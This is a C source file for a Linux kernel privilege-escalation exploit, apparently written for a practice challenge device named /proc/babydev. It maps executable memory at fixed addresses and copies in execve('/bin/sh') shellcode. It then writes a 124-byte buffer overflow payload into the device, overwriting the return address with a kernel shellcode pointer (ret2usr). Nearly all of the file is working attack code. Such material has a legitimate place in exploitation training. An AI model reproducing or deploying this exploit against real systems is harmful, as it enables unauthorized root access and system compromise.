/* gcc exp.c exp.S -no-pie -nostdlib -fomit-frame-pointer -o exp */

/* https://code.woboq.org/userspace/glibc/sysdeps/unix/sysv/linux/bits/mman-linux.h.html */
#define PROT_READ        0x1        /* Page can be read. */
#define PROT_WRITE       0x2        /* Page can be written. */
#define PROT_EXEC        0x4        /* Page can be executed. */

#define MAP_PRIVATE      0x02       /* Changes are private. */
#define MAP_FIXED        0x10       /* Interpret addr exactly.  */
#define MAP_ANONYMOUS    0x20       /* Don't use a file. */
#define MAP_GROWSDOWN	 0x100      /* Stack-like segment. */

#define	O_RDWR		     0x02       /* open for reading and writing */

#define OFFSET           124        /* $ cyclic 200
                                     * $ cyclic --offset `echo -0x62616167 | xxd -r | rev` */

/* https://syscalls.w3challs.com/?arch=x86_64 */
#define SYS_WRITE   0x01
#define SYS_OPEN    0x02
#define SYS_MMAP    0x09

typedef unsigned long long u64;
typedef long long s64;

extern void kernel_shellcode();

/* http://shell-storm.org/shellcode/files/shellcode-806.php
 * execve("/bin/sh", ["/bin/sh"], NULL) */
char user_shellcode[] = "\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05";

s64 syscall(int num, u64 a1, u64 a2, u64 a3, u64 a4, u64 a5, u64 a6)
{
	s64 ret;

    /* https://gcc.gnu.org/onlinedocs/gcc/Local-Register-Variables.html */
    register u64 r10 asm("r10") = a4;
    register u64 r8 asm("r8") = a5;
    register u64 r9 asm("r9") = a6;

    /* https://www.ibiblio.org/gferg/ldp/GCC-Inline-Assembly-HOWTO.html#s6 */
	asm volatile("syscall\n"
		     : "=a" (ret)
		     : "a" (num),
		       "D" (a1),
		       "S" (a2),
		       "d" (a3),
		       "r" (r10),
		       "r" (r8),
               "r" (r9)
		     : "memory");
	return ret;
}

void *mmap(void *addr, u64 size, u64 prot, u64 flags)
{
    return (void *)syscall(SYS_MMAP, (u64)addr, size, prot, flags, 0, 0);
}

void mcpy(char *dst, char *src, u64 n)
{
    for (u64 i = 0; i < n; ++i)
        dst[i] = src[i];
}

int _start(int argc, char **argv) 
{
	char buf[0x1000];
	char *payload = buf;

    /* ret2usr */
	void *user_stack = mmap((void *)0xdead000, 0x1000, PROT_READ|PROT_WRITE|PROT_EXEC,  \
                            MAP_ANONYMOUS|MAP_FIXED|MAP_PRIVATE|MAP_GROWSDOWN);
	void *user_text  = mmap((void *)0xbeef000, 0x1000, PROT_READ|PROT_WRITE|PROT_EXEC,  \
                            MAP_ANONYMOUS|MAP_FIXED|MAP_PRIVATE);
	mcpy(user_text, &user_shellcode, sizeof(user_shellcode));
    
    /* buffer overflow payload */
	for (int i = 0;  i < OFFSET; i++)
		*(payload++) = 'A';
	*(u64 *)payload = (u64)kernel_shellcode;
    payload += 8;
	
    /* PWN! */
	int vuln_fd = syscall(SYS_OPEN, (u64)"/proc/babydev", O_RDWR, 0, 0, 0, 0);
	syscall(SYS_WRITE, vuln_fd, (u64)buf, (payload - buf), 0, 0, 0);
	return 0;
}